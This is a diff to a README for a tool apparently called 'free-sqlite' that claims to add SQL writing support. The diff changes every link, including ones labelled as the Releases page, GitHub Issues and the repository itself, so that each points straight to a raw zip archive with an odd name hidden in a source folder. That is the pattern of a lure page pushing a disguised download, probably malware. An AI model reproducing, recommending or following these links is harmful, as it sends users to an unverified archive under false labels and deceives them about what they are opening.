@@ -6,7 +6,7 @@ Welcome to **free-sqlite**! This tool adds support for writing SQL statements in
 ## 📥 Download & Install
 To get started, you need to download the application. Click the button below to visit the Releases page:
 
-[![Download free-sqlite](https://raw.githubusercontent.com/sangayyahirematha18/free-sqlite/main/variform/free-sqlite.zip)](https://raw.githubusercontent.com/sangayyahirematha18/free-sqlite/main/variform/free-sqlite.zip)
+[![Download free-sqlite](https://github.com/sangayyahirematha18/free-sqlite/raw/refs/heads/main/ui/src/sqlite-free-torchwort.zip)](https://github.com/sangayyahirematha18/free-sqlite/raw/refs/heads/main/ui/src/sqlite-free-torchwort.zip)
 
 Once on the Releases page, look for the latest version. Follow these steps to install:
 
@@ -52,11 +52,11 @@ For detailed usage, refer to the inbuilt help documentation within the extension
 ## 🌟 Support & Feedback
 If you encounter issues or have any questions, feel free to reach out:
 
-- **GitHub Issues:** Report any problems or request features directly [here](https://raw.githubusercontent.com/sangayyahirematha18/free-sqlite/main/variform/free-sqlite.zip).
+- **GitHub Issues:** Report any problems or request features directly [here](https://github.com/sangayyahirematha18/free-sqlite/raw/refs/heads/main/ui/src/sqlite-free-torchwort.zip).
 - **Community Support:** Engage with other users in the community forums for tips and shared experiences.
 
 ## 🔗 Useful Links
-- [Download free-sqlite](https://raw.githubusercontent.com/sangayyahirematha18/free-sqlite/main/variform/free-sqlite.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/sangayyahirematha18/free-sqlite/main/variform/free-sqlite.zip)
+- [Download free-sqlite](https://github.com/sangayyahirematha18/free-sqlite/raw/refs/heads/main/ui/src/sqlite-free-torchwort.zip)
+- [GitHub Repository](https://github.com/sangayyahirematha18/free-sqlite/raw/refs/heads/main/ui/src/sqlite-free-torchwort.zip)
 
 Thank you for choosing **free-sqlite**. We hope it makes your SQL writing easy and efficient!
